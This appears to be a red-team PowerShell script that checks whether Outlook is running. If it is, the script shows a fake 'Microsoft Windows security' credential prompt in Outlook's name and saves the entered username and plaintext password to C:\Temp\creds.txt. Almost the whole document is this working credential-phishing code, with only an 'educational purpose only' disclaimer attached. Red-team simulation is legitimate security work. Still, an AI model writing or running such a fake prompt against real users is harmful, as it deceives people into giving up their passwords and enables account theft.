#Powershell

#==========================
#= Written by lutzenfried =
#==========================
#Use for educational purpose only

#Description : Just asking to credentials for user (red team engagement)
#Prerequisite : Credentials asker
#Scenario : Simulate popup asking for credentials used for authentication when Outlook is open.

#if (Get-Process | ?{$_.path -eq "C:\Program Files (x86)\Microsoft Office\root\Office16\OUTLOOK.EXE"})

$process = Get-Process
$processString = $process | Out-String

function popup-password
{
    $cred = $Host.ui.PromptForCredential("Microsoft Windows security", "Please enter your information for Microsoft Outlook","","")
    $user = $cred.UserName
    $pass = $cred.GetNetworkCredential().Password
    Out-File -FilePath C:\Temp\creds.txt -InputObject $user, $pass
}

if ($process -like '*OUTLOOK*') 
   {
   echo `r`n '++++ Outlook running, we are asking for password to user ++++'`r`n
   popup-password
   }

else
    {
    echo `r`n '---- Outlook not find in actual running process ----'`r`n
    }

 
